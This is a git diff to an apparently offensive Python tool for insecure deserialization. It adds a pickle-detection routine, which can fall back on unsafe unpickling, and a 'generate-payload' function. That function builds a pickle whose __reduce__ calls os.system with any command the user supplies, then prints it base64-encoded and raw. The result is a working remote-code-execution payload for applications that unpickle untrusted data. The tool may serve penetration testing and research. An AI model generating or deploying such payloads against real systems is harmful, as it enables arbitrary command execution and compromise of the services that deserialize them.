@@ -1,4 +1,11 @@
 import argparse
+import base64
+import os
+import pickle
+import pickletools
+
+import utils
+from utils import *
 
 g_args = None
 
@@ -16,13 +23,15 @@ def parse_args():
     # verify_parser.set_defaults(subcommand='verify')
     verify_parser.add_argument('--object', required=True, help="Object to verify(base64?)")
     verify_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
-    verify_parser.add_argument('--unsafe', required=False, help='Use dangerous deserialization functions to verify if the string is serialized object.'
-                                                                'Dangerous! Should only be used when sure the provided object is safe to deserialize.')
+    verify_parser.add_argument('--unsafe', required=False, action='store_true',
+                               help='Use dangerous deserialization functions to verify if the string is serialized object.'
+                                     'Dangerous! Should only be used when sure the provided object is safe to deserialize.')
 
     # create the parser for the generate-payload functionality
     generate_payload_parser = subparsers.add_parser('generate-payload', help="Generate serialized object with custom code")
     generate_payload_parser.add_argument('--cmd', required=False, help='cmd')
     generate_payload_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
+    generate_payload_parser.add_argument('--object', required=False, help="Create payload by appending desired code to the already existing pickle object")
 
     # create the parser for the confirm-vuln functionality
     confirm_vuln_parser = subparsers.add_parser('confirm-vuln', help="Test to confirm existence of vulnerability")
@@ -57,22 +66,101 @@ def parse_args():
 
 
 def verify():
-    print("[+] Inside verify module")
+    print("[+] Using verify module")
+
+    base64_encoded_object = str(g_args.object)
+    pickle_object = None
+    try:
+        pickle_object = base64.b64decode(base64_encoded_object)
+    except Exception:
+        print_red("[-] Not valid base64.")
+        return False
+
+    confidence = None
+
+    # try to detect base64 encoded pickle object without unpickling
+    if not g_args.unsafe:
+
+        # first try to detect only STOP opcode to detect potential pickle object,
+        # if the object does not end with STOP opcode no need to test further, object is not a valid pickle
+        if pickle_object.endswith(pickle.STOP):
+            confidence = "[+] Confidence: Might be pickle object. Ends with pickle STOP opcode"
+        else:
+            print_red("[-] Not a valid pickle object")
+            return False
+
+        # try to verify if provided object is pickle by disassembling it
+        # and verifying that it consists only of valid pickle opcodes
+        contains_only_pickle_opcodes = True
+        try:
+            for obj in pickletools.genops(pickle_object):
+                opcode_str = obj[0].code
+                if not (bytes(opcode_str, 'utf-8')) in [bytes(opcode.code, 'utf-8') for opcode in pickletools.opcodes]:
+                    contains_only_pickle_opcodes = False
+
+            if contains_only_pickle_opcodes:
+                print_green("[+] Detected pickle object")
+                confidence = "[+] Confidence: High"
+        except Exception:
+            print_red("[-] Not a valid pickle object")
+            return False
+
+    # try to deserialize object to verify
+    # unsafe!!!
+    else:
+        print("[+] using --unsafe")
+        try:
+            pickle.loads(pickle_object)
+            print_green("[+] Pickle object detected")
+            confidence = "[+] Confidence: Certain"
+        except Exception:
+            print_red("[-] Not a valid pickle object")
+            return False
+
+    print_green(confidence)
+    return True
 
 
-def generate_payload():
-    print("[+] Inside verify module")
+
+
+def generate_payload(): # todo: nadodati na postojeci pickle objekt
+    print("[+] Using generate-payload module")
+
+    cmd = None
+    if g_args.cmd:
+        cmd = g_args.cmd
+    else:
+        cmd = input("[+] Enter your command: ")
+
+    class exploit():
+        def __init__(self, command):
+            self.command = command
+        def __reduce__(self):
+            return os.system, (self.command,)
+
+    print("[+] Generating payload ... ")
+    print("\t[+] Base64 encoded payload: ", base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8"))
+    print("\t[+] Raw bytes payload: ", pickle.dumps(exploit(cmd)))
+
 
 
 def confirm_vuln():
-    print("[+] Inside confirm-vuln module")
+    print("[+] Using confirm-vuln module")
 
 
 def exploit():
-    print("[+] Inside exploit module")
+    print("[+] Using exploit module")
 
 def print_banner():
-    print("--banner-here--")
+    print(utils.banner)
+
+
+def print_green(txt):
+    print("\033[92m {}\033[00m".format(txt))
+
+
+def print_red(txt):
+    print("\033[91m {}\033[00m".format(txt))
 
 
 if __name__ == '__main__':
